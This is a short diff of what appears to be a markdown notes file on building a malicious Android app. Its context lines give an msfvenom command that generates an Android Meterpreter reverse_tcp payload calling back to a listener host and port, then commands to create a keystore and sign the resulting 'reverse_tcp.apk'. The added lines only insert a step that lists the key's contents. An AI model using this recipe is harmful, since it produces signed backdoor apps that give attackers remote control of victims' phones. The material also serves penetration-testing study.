@@ -8,6 +8,11 @@ msfvenom –p android/meterpreter/reverse_tcp LHOST=192.168.0.1  LPORT=4444 R > 
 
 keytool -genkey -V -keystore key.keystore -alias krnick -keyalg RSA -keysize 2048 -validity 1000
 
+
+## check your key content
+
+keytool -list -keystore key.keystore
+
 ## Sign
 
 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore reverse_tcp.apk krnick
